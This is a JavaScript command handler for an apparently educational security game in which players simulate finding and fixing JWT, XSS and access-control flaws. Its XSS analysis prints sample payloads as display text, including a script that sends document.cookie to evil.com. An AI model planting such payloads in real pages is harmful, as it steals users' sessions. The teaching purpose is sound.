import { COMMAND_IDS } from "../constants.js"
import { getLevelAndToolCommands } from "../levelHandlers.js"
import { JWTDecoder, SQLInjectionTester } from "../tools.js"

/**
 * Handles terminal command execution for NetGuard
 * Manages all command logic and integrates with GameState and GameUI
 */
export class CommandHandler {
  /**
   * @param {GameState} gameState - Game state instance
   * @param {GameUI} gameUI - Game UI instance
   */
  constructor(gameState, gameUI) {
    this.gameState = gameState
    this.gameUI = gameUI
  }

  /**
   * Get available commands based on current state and level
   * @returns {Array} Array of command objects
   */
  getAvailableCommands() {
    const baseCommands = [
      {
        id: COMMAND_IDS.SCAN,
        name: "systemctl status",
        description: "Check service status and system info",
        disabled: !this.gameState.currentNode,
      },
      {
        id: COMMAND_IDS.LOGS,
        name: "tail -f /var/log/system.log",
        description: "Review system logs",
        disabled: !this.gameState.currentNode,
      },
      {
        id: COMMAND_IDS.EXIT,
        name: "exit",
        description: "Disconnect from current host",
        disabled: !this.gameState.currentNode,
      },
    ]

    // Get level-specific and tool commands from handlers
    const levelCommands = getLevelAndToolCommands(this.gameState)

    return [...baseCommands, ...levelCommands]
  }

  /**
   * Execute a command by ID
   * @param {string} commandId - Command identifier
   */
  executeCommand(commandId) {
    const node = this.gameState.getCurrentNode()
    const cmd = this.getAvailableCommands().find((c) => c.id === commandId)

    if (!cmd) {
      this.gameUI.addTerminalLine(`Command not found: ${commandId}`, "error")
      return
    }

    if (cmd.disabled) {
      this.gameUI.addTerminalLine(`${cmd.name}: command not available in current context`, "error")
      return
    }

    // Show command without extra $ prefix (addTerminalLine with "command" class adds it)
    this.gameUI.addTerminalLine(cmd.name, "command")

    switch (commandId) {
      case "scan":
        this.scanNode(node)
        break
      case "logs":
        this.checkLogs(node)
        break
      case "analyze-tokens":
        this.analyzeTokens(node)
        break
      case "decode-jwt":
        this.gameUI.openTool("echo <token> | base64 -d", node)
        break
      case "fix-jwt":
        this.fixJWTExpiration()
        break
      case "analyze-xss":
        this.analyzeXSS()
        break
      case "fix-xss":
        this.fixXSS()
        break
      case "add-csp":
        this.addCSP()
        break
      case "check-auth":
        this.checkAuth()
        break
      case "fix-auth":
        this.fixAuth()
        break
      case "fix-session":
        this.fixSession()
        break
      case "exit":
        this.disconnectNode()
        break
    }

    this.gameUI.scrollTerminalToBottom()
  }

  /**
   * Scan a node
   * @param {Object} node - Node object
   */
  scanNode(node) {
    if (this.gameState.scannedNodes.has(node.id)) {
      this.gameUI.addTerminalLine("System already scanned. Use other commands for details.", "info")
      return
    }

    this.gameState.scanNode(node.id)

    // Simulate systemctl status output
    this.gameUI.addTerminalLine(`● ${node.type}.service - ${node.name}`, "")
    this.gameUI.addTerminalLine(
      `   Loaded: loaded (/etc/systemd/system/${node.type}.service; enabled)`,
      "",
    )
    this.gameUI.addTerminalLine(`   Active: active (running)`, "success")
    this.gameUI.addTerminalLine(`   Main PID: ${Math.floor(Math.random() * 50000 + 1000)}`, "")
    this.gameUI.addTerminalLine("", "")
    this.gameUI.addTerminalLine(node.scanResult, "")
    this.gameUI.addTerminalLine("", "")

    if (node.status === "unexamined") {
      this.gameState.updateNodeStatus(node.id, "healthy")
    }
  }

  /**
   * Check logs on a node
   * @param {Object} node - Node object
   */
  checkLogs(node) {
    this.gameUI.addTerminalLine(node.logs, node.clue ? "warning" : "")
    this.gameUI.addTerminalLine("", "")

    // Add clue if this node has one
    if (node.clue && !this.gameState.cluesFound.has(node.clue)) {
      this.gameState.addClue(node.clue)
      const clueDesc = this.gameState.currentLevel.clueDescriptions[node.clue]
      this.gameUI.addTerminalLine(`🔍 CLUE FOUND: ${clueDesc}`, "success")
      this.gameUI.addTerminalLine(
        `Clues discovered: ${this.gameState.cluesFound.size}/${this.gameState.currentLevel.requiredClues.length}`,
        "info",
      )
      this.gameUI.addTerminalLine("", "")

      if (node.id === "auth" && node.clue === "auth_config") {
        this.gameUI.addTerminalLine(
          "Try running ./analyze-tokens.sh to investigate further",
          "info",
        )
        this.gameState.updateNodeStatus(node.id, "suspicious")
      }
    }
  }

  /**
   * Analyze tokens (Level 1)
   * @param {Object} node - Node object
   */
  analyzeTokens(node) {
    if (!node.tokenData) {
      this.gameUI.addTerminalLine("No token data available.", "info")
      return
    }

    // Check if player has found enough clues
    const hasRequiredClues = node.tokenData.requiresClues.every((clue) =>
      this.gameState.cluesFound.has(clue),
    )

    if (!hasRequiredClues) {
      const missingClues = node.tokenData.requiresClues.filter(
        (clue) => !this.gameState.cluesFound.has(clue),
      )
      this.gameUI.addTerminalLine("Running token analysis...", "info")
      this.gameUI.addTerminalLine("---", "")
      this.gameUI.addTerminalLine("Found several active JWT tokens with valid signatures.", "")
      this.gameUI.addTerminalLine("Token claims include standard fields: sub, iat, exp, role.", "")
      this.gameUI.addTerminalLine("---", "")
      this.gameUI.addTerminalLine("⚠️ Need more context to identify issues.", "warning")
      this.gameUI.addTerminalLine(
        "Hint: Investigate other systems to gather clues about suspicious activity.",
        "info",
      )
      const missingDesc = missingClues.map((c) => this.gameState.currentLevel.clueDescriptions[c])
      this.gameUI.addTerminalLine(`Missing clues: ${missingDesc.join(", ")}`, "info")
      return
    }

    this.gameUI.addTerminalLine("Running comprehensive token analysis...", "info")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine(node.tokenData.details, "error")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("🔴 VULNERABILITY IDENTIFIED!", "error")
    this.gameUI.addTerminalLine("An expired contractor token is still being accepted.", "error")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("SECURITY LESSON:", "info")
    this.gameUI.addTerminalLine(node.tokenData.solution, "info")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("Run enable-jwt-expiration to fix this vulnerability.", "warning")

    if (node.sampleToken) {
      this.gameUI.addTerminalLine("", "")
      this.gameUI.addTerminalLine(
        `Sample token available. Use the decode command to analyze it manually.`,
        "info",
      )
    }

    // Mark that vulnerability has been identified and understood
    this.gameState.markVulnerabilityFound()
    this.gameState.updateNodeStatus(node.id, "compromised")
  }

  /**
   * Execute interactive tool
   */
  executeTool() {
    const toolName = this.gameUI.getToolTitle()
    const input = this.gameUI.getToolInput()

    if (!input) {
      this.gameUI.setToolOutput("Error: Input is required")
      return
    }

    this.gameUI.setToolOutput("Processing...\n")

    setTimeout(() => {
      try {
        if (toolName.includes("base64")) {
          // Check if input is a full JWT (3 parts) or just the payload
          const parts = input.split(".")
          let decoded
          if (parts.length === 3) {
            // Full JWT token
            decoded = JWTDecoder.decode(input)
          } else {
            // Just the payload part - decode it directly
            try {
              const payloadData = JSON.parse(atob(input))
              decoded = {
                header: { note: "Header not provided - only payload decoded" },
                payload: payloadData,
                signature: "Not provided",
              }
            } catch (e) {
              decoded = { error: "Invalid base64 or JSON in payload: " + e.message }
            }
          }
          this.gameUI.setToolOutput(JWTDecoder.formatDecoded(decoded))
        } else if (toolName.includes("psql")) {
          const originalQuery = "SELECT * FROM users WHERE id = '?'"
          const result = SQLInjectionTester.testPayload(input, originalQuery)

          if (result.vulnerable) {
            this.gameUI.setToolOutput(result.explanation + "\n\n" + result.fix)
          } else {
            this.gameUI.setToolOutput(result.message)
          }
        }
      } catch (err) {
        this.gameUI.setToolOutput(`Error: ${err.message}`)
      }
    }, 500)
  }

  /**
   * Fix JWT expiration vulnerability (Level 1)
   */
  fixJWTExpiration() {
    if (this.gameState.vulnerabilitiesFixed.has("jwt_expiration")) {
      this.gameUI.addTerminalLine("JWT expiration validation already enabled.", "info")
      return
    }

    this.gameUI.addTerminalLine("Enabling JWT expiration validation...", "info")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("✅ Updated jwt.config.js", "success")
    this.gameUI.addTerminalLine("✅ Restarted authentication service", "success")
    this.gameUI.addTerminalLine("✅ Expired tokens now rejected", "success")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("🛡️ Vulnerability patched!", "success")

    this.gameState.fixVulnerability("jwt_expiration")
    this.gameState.updateNodeStatus("auth", "healthy")
  }

  /**
   * Analyze XSS vulnerabilities (Level 2)
   */
  analyzeXSS() {
    this.gameUI.addTerminalLine("Searching for malicious scripts in database...", "info")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("Found 3 comments containing <script> tags:", "error")
    this.gameUI.addTerminalLine(
      "1. <script>window.location='https://evil.com?cookie='+document.cookie</script>",
      "error",
    )
    this.gameUI.addTerminalLine("2. <img src=x onerror='steal_cookies()'>", "error")
    this.gameUI.addTerminalLine("3. <iframe src='javascript:malicious()'>", "error")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("🔴 STORED XSS VULNERABILITY!", "error")
    this.gameUI.addTerminalLine("These scripts will execute in every user's browser!", "error")
  }

  /**
   * Fix XSS vulnerabilities (Level 2)
   */
  fixXSS() {
    if (this.gameState.vulnerabilitiesFixed.has("stored_xss")) {
      this.gameUI.addTerminalLine("XSS vulnerability already fixed.", "info")
      return
    }

    this.gameUI.addTerminalLine("Sanitizing user input...", "info")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("✅ Replaced innerHTML with textContent", "success")
    this.gameUI.addTerminalLine("✅ Implemented DOMPurify sanitization", "success")
    this.gameUI.addTerminalLine("✅ Removed malicious scripts from database", "success")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("🛡️ XSS vulnerability eliminated!", "success")

    this.gameState.fixVulnerability("stored_xss")
    this.gameState.fixVulnerability("reflected_xss")
    this.gameState.updateNodeStatus("comment-system", "healthy")
  }

  /**
   * Add Content Security Policy (Level 2)
   */
  addCSP() {
    if (this.gameState.vulnerabilitiesFixed.has("missing_csp")) {
      this.gameUI.addTerminalLine("Content Security Policy already configured.", "info")
      return
    }

    this.gameUI.addTerminalLine("Adding Content Security Policy...", "info")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("✅ Added CSP header to server config", "success")
    this.gameUI.addTerminalLine("✅ Restricted script sources to 'self'", "success")
    this.gameUI.addTerminalLine("✅ Disabled inline scripts", "success")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("🛡️ CSP will block XSS even if sanitization fails!", "success")

    this.gameState.fixVulnerability("missing_csp")
    this.gameState.updateNodeStatus("web-server", "healthy")
  }

  /**
   * Check authentication (Level 3)
   */
  checkAuth() {
    this.gameUI.addTerminalLine("Auditing authorization checks...", "info")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("⚠️ Admin panel: Only checks login, NOT role!", "error")
    this.gameUI.addTerminalLine("⚠️ API endpoints: Missing ownership validation!", "error")
    this.gameUI.addTerminalLine("⚠️ Session tokens: Predictable format detected!", "error")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("Attack Chain Identified:", "warning")
    this.gameUI.addTerminalLine("1. Regular user accesses admin panel (no role check)", "warning")
    this.gameUI.addTerminalLine("2. User modifies other users' data (IDOR)", "warning")
    this.gameUI.addTerminalLine("3. Attacker forges session tokens (predictable IDs)", "warning")
    this.gameUI.addTerminalLine("4. Privilege escalation to admin complete", "warning")
  }

  /**
   * Fix authentication bypass (Level 3)
   */
  fixAuth() {
    if (this.gameState.vulnerabilitiesFixed.has("auth_bypass")) {
      this.gameUI.addTerminalLine("Authorization checks already fixed.", "info")
      return
    }

    this.gameUI.addTerminalLine("Adding proper authorization checks...", "info")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("✅ Added role-based access control (RBAC)", "success")
    this.gameUI.addTerminalLine("✅ Implemented object-level authorization", "success")
    this.gameUI.addTerminalLine("✅ Admin endpoints require 'admin' role", "success")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("🛡️ Authorization bypass fixed!", "success")

    this.gameState.fixVulnerability("auth_bypass")
    this.gameState.updateNodeStatus("admin-panel", "healthy")
  }

  /**
   * Fix session token vulnerability (Level 3)
   */
  fixSession() {
    if (this.gameState.vulnerabilitiesFixed.has("broken_access_control")) {
      this.gameUI.addTerminalLine("Session tokens already secured.", "info")
      return
    }

    this.gameUI.addTerminalLine("Securing session tokens...", "info")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("✅ Using crypto.randomBytes() for session IDs", "success")
    this.gameUI.addTerminalLine("✅ Invalidated all existing sessions", "success")
    this.gameUI.addTerminalLine("✅ Added session rotation on privilege change", "success")
    this.gameUI.addTerminalLine("---", "")
    this.gameUI.addTerminalLine("🛡️ Session hijacking vulnerability eliminated!", "success")

    this.gameState.fixVulnerability("broken_access_control")
    this.gameState.updateNodeStatus("session-store", "healthy")
  }

  /**
   * Disconnect from current node
   */
  disconnectNode() {
    const node = this.gameState.getCurrentNode()
    this.gameUI.addTerminalLine("logout", "")
    this.gameUI.addTerminalLine(`Disconnected from ${node.hostname}`, "info")
    this.gameUI.addTerminalLine("---", "")

    this.gameState.disconnectNode()
  }
}
